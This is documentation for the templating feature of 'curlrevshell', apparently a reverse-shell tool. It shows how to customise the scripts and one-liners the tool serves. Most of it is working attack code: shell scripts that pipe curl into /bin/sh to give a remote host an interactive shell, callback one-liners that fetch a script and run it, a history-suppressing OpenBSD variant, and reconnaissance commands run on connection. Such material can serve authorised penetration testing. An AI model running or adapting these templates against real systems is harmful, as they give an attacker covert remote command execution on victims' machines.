`-template` Templates
=====================
`curlrevshell` tries to use pretty unrisky defaults at the cost of not being
all that fancy.

To jazz it up a bit, `-template` takes a
[Go Text Template](https://pkg.go.dev/text/template#pkg-overview) which
sets the script sent with `/c` as well as the helpful one-liners.  

In practice, this takes the form of handing curlrevshell one or more
templates-inside-templates (i.e. [subtemplates](#subtemplates)) which it
executes with (i.e. `dot` is set to) a structure of type
[Params](../lib/crstemplate/params.go).

Much easier with a few [examples](#longer-examples).

Quickstart
----------
```sh
# Make a copy of the default template
curlrevshell -print-default-template >crs.tmpl
# Spruce up the bits between {{- define ... -}} and {{- end -}}
vi ./crs.tmpl
# Use it!
curlrevshell -template ./crs.tmpl
```

Longer Examples
---------------
In general, it's probably easiest to start with the default template, like in
the [Quickstart section](#quickstart), above.  The below examples don't, for
ease of reading (but less ease of writing).

### Better initial shell
Try to grab some useful info before we hook up curl to stdin.
```
{{define "script"}}

#!/bin/sh
{
    echo 'ps awwwfux; uname -a; id'
    exec {{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N
} </dev/null 2>&0 |
/bin/sh 2>&1 |
{{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- >/dev/null 2>&1

{{end}}
```

### TLS SNI
Set the domain used in curl's TLS ServerHello message
```
{{- define "curl" -}}

curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} --resolve kittens.com:4444:192.168.178.23 https://{{.URL}}

{{- end -}}
```

### OS-specific callback script
Override a couple of [Subtemplates](#Subtemplates) to make requests to
`/c/openbsd` work a little nicer.

```
{{/* Add OpenBSD-specific callback one-liners. */}}
{{- define "callback" -}}
{{template "curl" .}}/{{.URLPaths.Script}}/openbsd | /bin/ksh # OpenBSD
{{template "curl" .}}/{{.URLPaths.Script}} | /bin/sh          # Other OSs
{{- end -}}

{{/* For OpenBSD targets, serve up a slightly nicer script. */}}
{{- define "script" -}}

{{- if eq "/c/openbsd" .Path -}} {{/* OpenBSD Gymnastics */}}
#!/bin/ksh
(export HISTFILE=/dev/null; ps awwfux; uname -a; id; exec /bin/ksh) >&1 |&
{{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N  >&p </dev/null 2>&0 &
{{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- <&p >/dev/null 2>&1 &

{{ else }} {{/* Normal Unixish targets. */}}
#!/bin/sh
{{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N  </dev/null 2>&0 |
/bin/sh 2>&1 |
{{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- >/dev/null 2>&1

{{- end -}}
{{- end -}}
```

Subtemplates
------------
The following subtemplates are available:

Subtemplate | Generates a...
------------|:------------ 
`callback`  | ...`To get a shell:` one-liner
`files`     | ...one-liner to download static files
`script`    | ...shell hooked up to two `curl`s (for `/c`)
`curl`      | ...consistent `curl` command for the other subtemplates

Any or all may be put into a `-template` file.

If a subtemplate isn't specified, a [built-in](../lib/crstemplate/script.tmpl)
default will be used.

Dot
---
Subtemplates will be executed with
[`dot`](https://pkg.go.dev/text/template#pkg-overview)
 set to an instance of [Params](../lib/crstemplate/params.go).
In practice, this means the following are available:

Parameter          | Example                                        | Description
-------------------|------------------------------------------------|------------
`.PubkeyFP`        | `9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=` | SHA256 hash of the TLS certificate, suitable for use with curl's `--pinnedpubkey sha256//`
`.URL`             | `192.168.1.10:4444`                            | Server's address or domain and port, possibly taken from the request to `/c`
`.ID`              | `zcj5vz3zp6ce`                                 | A random string
`.URLPaths.In`     | `i`                                            | URL Path to use for shell input
`.URLPaths.InOut`  | `io`                                           | URL Path to use for both shell input and output
`.URLPaths.Out`    | `o`                                            | URL Path to use for shell output
`.URLPaths.Script` | `c`                                            | URL Path which generates a script which calls back with a shell
